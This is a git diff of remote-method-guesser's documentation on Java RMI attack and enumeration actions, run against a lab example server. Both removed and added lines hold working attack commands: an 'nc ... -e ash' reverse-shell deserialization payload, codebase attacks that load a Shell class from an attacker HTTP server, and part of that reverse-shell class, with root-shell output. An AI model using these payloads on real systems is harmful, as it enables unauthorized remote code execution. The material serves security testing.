@@ -2,184 +2,26 @@
 
 ----
 
-In this document you can find more detailed information on the different available *rmg* actions.
+In this document you can find additional information for some of *remote-method-guesser's* actions.
 
-* [act](#activator-action)
-* [bind|rebind|unbind](#bind-actions)
-* [codebase](#codbase-action)
+* [codebase](#codebase-action)
 * [enum](#enum-action)
 * [guess](#guess-action)
-* [reg|dgc](#registry-and-dgc-actions)
-
-
-### Activator Action
-
-----
-
-One crucial part of remote method invocation on *Java RMI* endpoints are *RemoteObjects*. A *RemoteObject* is basically an instance of
-a class that is made available over the network. Each *RemoteObject* which is registered in the current runtime is associated with
-a corresponding ``ObjID``. During a *RMI call*, the *RMI client* sends all required information for the call, together with the
-``ObjID`` for the desired *RemoteObject* to the server. The server looks up the ``ObjID`` value and dispatches the call to the
-corresponding *RemoteObject*.
-
-*RMI clients* usually obtain the ``ObjID`` for a *RemoteObject* in two different ways:
-
-  1. Well known *RemoteObjects* (those that are used for internal RMI communication), have fixed and well known ``ObjID`` values.
-  2. Other *RemoteObjects* are usually obtained using the *RMI registry*, which provides the ``ObjID`` values during the object lookup.
-
-The probably most well known *well known RemoteObjects* are the *RMI registry* (``ObjID = 0``) and the *distributed garbage collector* (``ObjID = 2``),
-but there is one other well known *RemoteObject* that is no longer that well known. This *RemoteObject* is the *activator* (``ObjID = 1``)
-that was (not sure if really true, but at least some references mention that) once a mandatory part of *Java RMI*, but became optional in
-*Java 8* [1](https://openjdk.java.net/jeps/385). From here on, it was no longer commonly used and the amount of reliable documentation and
-projects that still use it is quite low. From the small amount of documentation that is available [2](https://docs.oracle.com/javase/9/docs/specs/rmi/activation.html)
-we conclude that the *activation system* is used for the following purpose:
-
-It seems to allow the creation of *RemoteObjects* on demand. With regular *Java RMI*, the client obtains a *remote reference* from the
-*RMI registry* that points to an existing *RemoteObject*. When the corresponding *RemoteObject* does not exist, regular *RMI calls* simply
-lead to a ``ConnectException`` or ``NoSuchObjectException``. However, with an ``Activator`` present, the situation is a little bit different,
-as clients obtain not only a *remote reference*, but also an ``ActivationID`` when looking up a *RemoteObject*.
-
-The ``ActivationID`` can now be used to create *RemoteObjects* on demand. When a client dispatches a *RMI call*, it first tries to
-dispatch it directly using the *remote reference* for the corresponding *Remote Object*. When this call fails, it sends an *activate
-request* to the ``Activator``, containing the ``ActivationID`` it obtained previously. The ``Activator`` can now create the object
-and return the new *remote reference* back to the client (as already mentioned, this explanation is probably not fully correct and
-misses many details, but it is sufficient for our purpose).
-
-**TL;DR** - The ``Activator`` is just another well known *RemoteObject* with a fixed ``ObjID`` and known *remote methods*. The reason why it
-is interesting from an offensive perspective is, because it did never profit from *JEP290* and still uses no deserialization filters.
-As it's only *remote method* ``activate`` takes a non primitive argument, it is a prime target for deserialization attacks.
-Since version ``v3.1`` the *rmg-example-server* runs an ``Activator`` remote object on the ``9010`` registry port.
-The following listing shows an example *deserialization attack*:
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 act CommonsCollections6 'nc 172.17.0.1 4444 -e ash'
-[+] Creating ysoserial payload... done.
-[+] 
-[+] Attempting deserialization attack on Activation endpoint...
-[+] 
-[+] 	Caught IllegalArgumentException during deserialization attack.
-[+] 	Deserialization attack was probably successful :)
-
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:46499.
-id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-Apart from being vulnerable to *deserialization attacks*, the ``Activator`` can also be vulnerable to remote class loading attacks.
-For this attack to work, the ``ActivationSystem`` needs to run with ``useCodebaseOnly=false`` and a security policy that allows
-the requested operation. The default implementation for the *activation system* (``rmid``) uses the same *SecurityManager* as the
-*RMI registry*. Therefore, pulling classes from remote is always allowed.
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature act
-[+] Attempting codebase attack on Activator endpoint...
-[+] Using class Shell with codebase http://172.17.0.1:8000/ during activate call.
-
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:31:28] "GET /Shell.class HTTP/1.1" 200 -
-
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:36110.
-id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-
-### Bind Actions
-
-----
-
-By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
-During these actions *remote-method-guesser* just makes legitimate usage of the corresponding *remote methods* that are exposed by the
-registry and calls them in the intended way. On a fully patched server, this should only work from localhost, as the *RMI registry*
-validates the incoming client connection against all local IP addresses. An exception for this situation are servers that are vulnerable
-to ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform bind operations. To use this bypass
-technique, you need to specify ``--localhost-bypass`` together with the corresponding *bind action*.
-
-Whereas the ``unbind`` action only requires the *bound name* that should be removed from the registry, the ``bind`` and ``rebind`` operations
-also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
-for this purpose, which is the *RemoteObject* normally used by *jmx* servers. As *jmx* is part of the most common *Java Runtime Environments*,
-it is likely that the registry can bind this object. Notice that arbitrary objects cannot be bound, as they need to be known by the *RMI registry*.
-Nonetheless, you can attempt to bind arbitrary objects by using *rmg's* [Plugin System](./plugin-system.md).
-
-*RemoteObjects* within the *RMI registry* are actually just references to their corresponding *TCP endpoints*. For this reason, during the ``bind``
-and ``rebind`` operations, you have to specify an address for the corresponding endpoint. Clients that attempt to communicate with your
-*bound name* as well as the *RMI registry* itself will sent *JRMP calls* to the specified endpoint from time to time. Depending on the server or
-client configuration, this can be used for *deserialization attacks*.
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- plain-server
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 bind 172.17.0.1:4444 --bound-name jmxrmi --localhost-bypass
-[+] Binding name jmxrmi to javax.management.remote.rmi.RMIServerImpl_Stub
-[+] 
-[+] 	Encountered no Exception during bind call.
-[+] 	Bind operation was probably successful.
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- plain-server
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 unbind --bound-name plain-server --localhost-bypass
-[+] Ubinding bound name plain-server from the registry.
-[+] 
-[+] 	Encountered no Exception during unbind call.
-[+] 	Unbind operation was probably successful.
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-```
+* [SSRF Support](#ssrf-support)
 
 
 ### Codebase Action
 
 ------
 
-In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
-This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class
-(not known by the server) within *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
-on most *Java RMI* servers.
+In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within *Java RMI*.
+This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class,
+that is not known by the server, during *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
+on most *Java RMI* endpoints.
 
-Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
-lax configured security policy. Unfortunately, common security tools like e.g. *Metasploit* use a wrong approach for testing this vulnerability, as they
-are still targeting the *Distributed Garbage Collector* (*DGC*) and look for the string ``RMI class loader disabled``, which is returned if no security manager
-is used. On modern *RMI endpoints*, such an enumeration is no longer working for the following reasons:
+Despite being fixed in the default configuration, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false``
+and uses a *SecurityManager* with a lax configured security policy. Unfortunately, the current tool landscape for *Java RMI* does not include reliable checks for
+this vulnerability. Most tools focus on the *Distributed Garbage Collector*, which is not ideal for the following reasons:
 
 1. The *Distributed Garbage Collector* sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
    ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.
@@ -193,7 +35,8 @@ is used. On modern *RMI endpoints*, such an enumeration is no longer working for
    classes are rejected while reading the ``ObjectInputStream``. Whereas the *RMI registry* allows unknown classes that implement certain interfaces, the *DGC*
    uses a more strict *deserialization filter* and it is not possible to send unknown classes to it.
 
-For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. A little bit better is the
+For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. It can be used to detect whether a
+*Security Manager* is used, but that is only one of the mandatory conditions for being vulnerable to codebase attacks. A little bit better is the
 situation for the *RMI registry*. The *RMI registry* still respects a user defined ``useCodebaseOnly`` setting and uses a *SecurityManager* that allows outbound
 connections by default. Therefore, a setting of ``useCodebaseonly=false`` is already sufficient to load classes from remote. However, there are two downsides:
 
@@ -204,6 +47,9 @@ connections by default. Therefore, a setting of ``useCodebaseonly=false`` is alr
    argument of the ``lookup(String name)`` method was unmarshalled via ``readObject``. However, on most recent *RMI registries* you can only use the ``bind``
    and ``rebind`` methods, that can only be invoked from localhost.
 
+3. The *RMI registry* uses an security manager by default only in it's default implementation. When the *RMI registry* is created manually, no security manager
+   is created by default.
+
 Whereas the *internal RMI communications* (*DGC* and *RMI registry*) are well protected, *RMI communication* on the application level is not. A server configured
 with ``useCodebaseonly=false`` and a lax configured *SecurityManager* might be exploitable, but you need to know a valid method signature. Furthermore, also
 on the application level it is required that the *remote method* leads to a call to ``readObject`` on the server side. Therefore, the targeted remote method
@@ -211,22 +57,21 @@ needs non primitive input parameters. As in case of the registry, ``java.lang.St
 newer ones. The following listing shows an example for a successful codebase attack:
 
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
-[+] Class de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub is treated as legacy stub.
-[+] You can use --no-legacy to prevent this.
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --signature 'String login(java.util.HashMap dummy1)' --bound-name legacy-service
 [+] Attempting codebase attack on RMI endpoint...
 [+] Using class Shell with codebase http://172.17.0.1:8000/ during login call.
-[+] 
+[+]
 [+] 	Using non primitive argument type java.util.HashMap on position 0
 [+] 	Specified method signature is String login(java.util.HashMap dummy1)
+[+]
 ```
 
 When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:
 
 ```console
-[qtc@kali ~]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:46:41] "GET /Shell.class HTTP/1.1" 200 -
+172.17.0.2 - - [01/Dec/2021 07:36:10] "GET /Shell.class HTTP/1.1" 200 -
 ```
 
 *remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
@@ -242,12 +87,13 @@ import java.net.Socket;
 import java.util.jar.Attributes;
 import java.io.Serializable;
 import java.io.ObjectInputStream;
+import java.rmi.Remote;
 
-public class Shell implements Serializable
+public class Shell implements Serializable, Remote
 {
     private static int port = 4444;
     private static String cmd = "/bin/ash";
-    private static String host = "172.18.0.1";
+    private static String host = "172.17.0.1";
     private static final long serialVersionUID = 2L;
 
     private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
@@ -286,7 +132,7 @@ public class Shell implements Serializable
 After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:
 
 ```console
-[qtc@kali ~]$ nc -vlp 4444
+[qtc@devbox ~]$ nc -vlp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -296,21 +142,25 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-As previously mentioned, the internal *DGC communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
+As previously mentioned, the internal *RMI communication* of modern *RMI endpoints* is hardened against *codebase* and *deserialization attacks*.
 Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
 vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
 endpoints, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.
 
+However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
+by the deserialization filters of the *RMI registry*. This is why the above mentioned payload class needs to implement ``java.rmi.Remote``.
+Without implementing this interface, the class would have been rejected by the *RMI registry*.
+
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature reg
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --component reg
 [+] Attempting codebase attack on RMI Registry endpoint...
 [+] Using class Shell with codebase http://172.17.0.1:8000/ during lookup call.
 
-[qtc@kali www]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:49:52] "GET /Shell.class HTTP/1.1" 200 -
+172.17.0.2 - - [01/Dec/2021 07:38:04] "GET /Shell.class HTTP/1.1" 200 -
 
-[qtc@kali ~]$ nc -vlp 4444
+[qtc@devbox ~]$ nc -vlp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -320,37 +170,117 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
-by the deserialization filters of the *RMI registry*. The following listing shows the modifications applied to the ``Shell`` class
-in the example above:
+When performing codebase attacks on the *Distributed Garbage Collector*, the response can contain a confusing error message:
 
-```java
-[...]
-import java.rmi.Remote;
-
-public class Shell implements Serializable, Remote
-[...]
+```console
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Example 172.17.0.1:8000 --component dgc --stack-trace
+[+] Attempting codebase attack on DGC endpoint...
+[+] Using class Example with codebase http://172.17.0.1:8000/ during clean call.
+[+]
+[-] 	Caught unexpected AccessControlException during clean call.
+[-] 	The servers SecurityManager may refused the operation.
+[-]
+[-] 	StackTrace:
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+	java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+	java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.security.AccessControlException: access denied ("java.net.SocketPermission" "iinsecure.dev:80" "connect,resolve")
+	at java.security.AccessControlContext.checkPermission(Unknown Source)
+	[...]
 ```
+
+The message that access to the class loader is denied and the fact that the *DGC* requests *connect* and
+*resolve* permissions looks like it would actually respect the user specified codebase. However, this is not the case.
+As mentioned above, the *DGC* nowadays always runs with ``useCodebaseOnly=true`` and does not respect user defined settings.
+The crucial part in the above error message is the location from which the *DGC* want's to load the class: ``iinsecure.dev:80``.
+This is the server side codebase and not the codebase location that was specified on the command line. A setting of
+``useCodebaseOnly=false`` only ignores client specified codebases, whereas server codebases are still used. However, since
+the *DGC* uses it's own and very strict ``AccessControlContext``, you get the *access denied* error.
 
 
 ### Enum Action
 
 ------
 
-The ``enum`` action is *rmg's* base action and basically performs an *RMI vulnerability scan*. In this section,
-the different checks of the ``enum`` action and it's outputs are explained in more detail:
+In this section, the different checks of the ``enum`` action and it's outputs are explained in more detail:
 
 
 #### Bound Name Enumeration
 
-The bound name enumeration should be self explanatory. In this check *rmg* simply obtains a list of bound names
-registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the class or interface
-name that is used when dispatching calls to the corresponding bound name. Obtained class names are printed
-and marked as either *known* or *unknown*. The *unknown* marker means that the corresponding *remote class* is not
-available within your own classpath. As the amount of default *remote classes* within a *JRE* is quite limited and
-most *RMI endpoints* use custom *remote classes*, this marker should appear the majority of times. However, for some
-well known services like *JMX* you may also encounter the *known* marker, as the ``RMIServerImpl_Stub`` class that
-is used by *JMX* is available on your *JRE* as well.
+The bound name enumeration should be self explanatory. In this check *remote-method-guesser* simply obtains a
+list of bound names registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the
+class or interface name that is used when dispatching calls to the corresponding bound name. Obtained class names
+are printed and marked as either *known* or *unknown*. *remote-method-guesser* contains a database of known *RMI*
+classes. These are classes that have been encountered before and for which certain meta information is available.
+Corresponding class names can be used in *remote-method-guesser's* ``known`` action to view the stored meta information:
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 6
+[+] RMI registry bound names:
+[+]
+[+] 	- jmxrmi
+[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
+[+] 		    Endpoint: iinsecure.dev:42222 ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
+[+]
+[qtc@devbox ~]$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
+[+] Name:
+[+] 	JMX Server
+[+]
+[+] Class Name:
+[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
+[+] 	- javax.management.remote.rmi.RMIServer
+[+]
+[+] Description:
+[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
+[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
+[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
+[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
+[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
+[+]
+[+] Remote Methods:
+[+] 	- String getVersion()
+[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
+[+]
+[+] References:
+[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
+[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
+[+]
+[+] Vulnerabilities:
+[+]
+[+] 	-----------------------------------
+[+] 	Name:
+[+] 		MLet
+[+]
+[+] 	Description:
+[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
+[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
+[+] 		is therefore most of the time equivalent to remote code execution.
+[+]
+[+] 	References:
+[+] 		- https://github.com/qtc-de/beanshooter
+[+]
+[+] 	-----------------------------------
+[+] 	Name:
+[+] 		Deserialization
+[+]
+[+] 	Description:
+[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
+[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
+[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
+[+] 		establish a working JMX connection, you can also perform deserialization attacks.
+[+]
+[+] 	References:
+[+] 		- https://github.com/qtc-de/beanshoote
+```
+
+Apart from the bound names and the class information, *remote-method-guesser* displays information on the remote
+objects ``ObjID`` and the corresponding *RMI endpoint* the bound name is referring to.
 
 
 #### Codebase Enumeration
@@ -368,11 +298,19 @@ As with client specified codebases, remote class loading is always a security ri
 developing applications that use *Java RMI* for client-server communication, you usually already compile all required classes
 and interface definitions into the client. Exposing a server-side codebase is therefore usually not required.
 
-*rmg* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
+*remote-method-guesser* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
 encountering a  ``HTTP`` based server-side codebase can be huge deal. It may allows you to download class definitions
 that expose information about the *RMI* endpoint. Sometimes you also find codebases that rely on the ``file`` protocol.
 While not being that useful without server access, a ``file`` based codebase still reveals internal paths that could
 be useful for other attacks as well.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3
+[+] RMI server codebase enumeration:
+[+]
+[+] 	- http://iinsecure.dev/well-hidden-development-folder/
+[+]
+```
 
 
 #### String Marshalling
@@ -385,12 +323,21 @@ In *June 2020*, the unmarshalling behavior of the ``String`` type [was changed](
 Instead of unmarshalling ``String`` via ``readObject``, the ``String`` type is now read via ``readString`` on modern
 *RMI* endpoints. This prevents certain attack types on remote methods that only accept ``String`` typed arguments.
 
-*rmg* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
+*remote-method-guesser* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
 outputs during its enumeration:
 
 * **Current Default**: The ``String`` type is unmarshalled via ``readString``.
 * **Outdated**: The ``String`` type is unmarshalled via ``readObject``, which usually means that the corresponding
   *RMI endpoint* is out of date.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling
+[+] RMI server String unmarshalling enumeration:
+[+]
+[+] 	- Caught ClassNotFoundException during lookup call.
+[+] 	  --> The type java.lang.String is unmarshalled via readObject().
+[+] 	  Configuration Status: Outdated
+```
 
 
 #### useCodebaseOnly Enumeration
@@ -405,6 +352,24 @@ one of the following results:
 Notice that the second status was intentionally not named **Vulnerable**, as the actual exploitability depends on the settings
 of the ``SecurityManager``. Please refer to the [codebase action](#codebase-action) section for more details.
 
+The codebase enumeration is implemented by sending a malformed *URL* as client side codebase during *RMI calls*. When
+*useCodebaseOnly* is set to *false* (and a *SecurityManager* is present), the server attempts to parse the malformed *URL*
+and throws a corresponding exception. This makes the codebase enumeration very reliable.
+
+Codebase enumeration is only supported for registry endpoints, since the *DGC* is not suitable for an reliable enumeration
+(see [codebase action](#codebase-action)). Furthermore, the ``String`` type needs to be unmarshalled via ``readObject``.
+If this is not the case, you can still enumerate the *useCodebaseOnly* setting from localhost *RMI endpoints* by using a different
+method than ``lookup`` in the ``--registry-method`` option.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase
+[+] RMI server useCodebaseOnly enumeration:
+[+]
+[+] 	- Caught MalformedURLException during lookup call.
+[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
+[+] 	  Configuration Status: Non Default
+```
+
 
 #### CVE-2019-2684 Enumeration
 
@@ -417,22 +382,36 @@ either of the following:
 * **Non Vulnerable**: The vulnerability is patched.
 * **Vulnerable**: The server is vulnerable (can be confirmed by using e.g. *rmg's* ``bind`` action.
 
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass
+[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+[+]
+[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
+[+] 	  Vulnerability Status: Vulnerable
+```
 
-#### DGC Enumeration
 
-The *DGC* enumeration is basically a legacy check that is no longer really useful. As detailed in the [codebase section](#codebase-action),
-the *DGC* uses it's own hardening settings with very strict configurations regarding deserialization and usage of codebases.
-The check performs basically a codebase enumeration on the *DGC* and inspects the corresponding exception message. The message is compared
-to some known values and one of the following status is printed:
+#### Security Manager Enumeration
 
-* **Non Default**: The *DGC* attempted to parse the codebase (``useCodebaseOnly=false``). This also means that the *Java RMI* endpoint
-  is way outdated (2012).
-* **Outdated**: The **DGC** complained about a missing security manager. This exception message is used by older *RMI* endpoints. The
-  *DGC* itself is not vulnerable, but you may find vulnerabilities on other *RMI components*.
-* **Current Default**: The *DGC* rejected access to the classloader, which is default for most current *DGC* implementations.
+The *security manager enumeration* is what other *RMI tools* do during their *codebase* enumeration. It uses calls to the
+*Distributed Garbage Collector* to verify whether a security manager is present on the server side.
 
-To clarify: I would not rely on this check e.g. for reporting it as a vulnerability. The check is outdated and only left in place because
-it is already implemented. In rare situations, the result can be interesting, but most of the time it should be ignored.
+* **Current Default**: Is displayed when the enumeration is successful, independent of the result (*SecurityManager* present or not).
+  Whether a *SecurityManager* is present can be read from the status message.
+* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used.
+  As explained in the [codebase-action](#codebase-action) section, this is usually pointless, but for very old *DGC* instances
+  it can still work. The *DGC* when attempts to parse the malformed codebase and throws an exception. The endpoint is marked
+  as **Outdated** in this case.
+
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager
+[+] RMI Security Manager enumeration:
+[+]
+[+] 	- Security Manager rejected access to the class loader.
+[+] 	  --> The server does use a Security Manager.
+[+] 	  Configuration Status: Current Default
+```
 
 
 #### JEP 290 Enumeration
@@ -442,6 +421,14 @@ to the *DGC* and inspects the returned exception message. The corresponding resu
 
 * **Non Vulnerable**: *JEP 290* is installed and the *DGC* rejected the deserialization.
 * **Vulnerable**: The ``java.util.HashMap`` object was deserialized and the endpoint is vulnerable to deserialization attacks.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290
+[+] RMI server JEP290 enumeration:
+[+]
+[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
+[+] 	  Vulnerability Status: Non Vulnerable
+```
 
 
 #### JEP 290 Bypass Enumeration
@@ -457,6 +444,14 @@ with an invalid set of arguments. Depending on the corresponding exception messa
 Notice that for this enumeration technique to work from remote, the *RMI registry* must use ``readObject`` to unmarshal the ``String`` type.
 From localhost, you can also enumerate servers that use ``readString``, by using e.g. the ``--reg-method bind`` option.
 
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass
+[+] RMI registry JEP290 bypass enmeration:
+[+]
+[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
+[+] 	  Vulnerability Status: Vulnerabl
+```
+
 
 #### Activation System Enumeration
 
@@ -465,6 +460,15 @@ This enumeration tells you whether an activator instance is available on the tar
 
 * **Current Default**: No activator object is present.
 * **Vulnerable**: An activator is present and allows deserialization and probably codebase attacks.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator
+[+] RMI ActivationSystem enumeration:
+[+]
+[+] 	- Caught IllegalArgumentException during activate call (activator is present).
+[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
+[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
+```
 
 
 ### Guess Action
@@ -476,183 +480,237 @@ to the remote server. This operation requires a wordlist that contains the corre
 following form:
 
 ```console
-[qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
-boolean call(String dummy, String dummy2, String dummy3)
-boolean call(String dummy, String dummy2)
-boolean call(String dummy, String[] dummy2)
-boolean call(String dummy)
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
 boolean call(String[] dummy)
+boolean call(String dummy)
+boolean call(String dummy, String[] dummy2)
+boolean call(String dummy, String dummy2)
+boolean call(String dummy, String dummy2, String dummy3)
 ```
 
-*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
-You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
-or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
-``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
-invocation cannot be prevented by using invalid argument types.
+*remote-method-guesser* ships some default wordlists that are included in the executable jar file.
+Modifying the default wordlists can be done via the [rmg configuration file](./src/config.properties) and rebuilding the project.
+To dynamically choose a different wordlist file you can use the``--wordlist-file`` or ``--wordlist-folder`` options.
+The default wordlists are stored in an optimized wordlist format. *remote-method-guesser* updates custom wordlists to
+the optimized format when you run the ``guess`` action with the ``--update`` option.
 
 ```console
-[qtc@kali ~]$ rmg --ssl --zero-arg 172.18.0.2 1090 guess
-[+] Reading method candidates from internal wordlist rmg.txt
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
+boolean call(String[] dummy)
+boolean call(String dummy)
+boolean call(String dummy, String[] dummy2)
+boolean call(String dummy, String dummy2)
+boolean call(String dummy, String dummy2, String dummy3)
+
+[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --update --wordlist-file /tmp/wordlist.txt
+[+] Reading method candidates from file /tmp/wordlist.txt
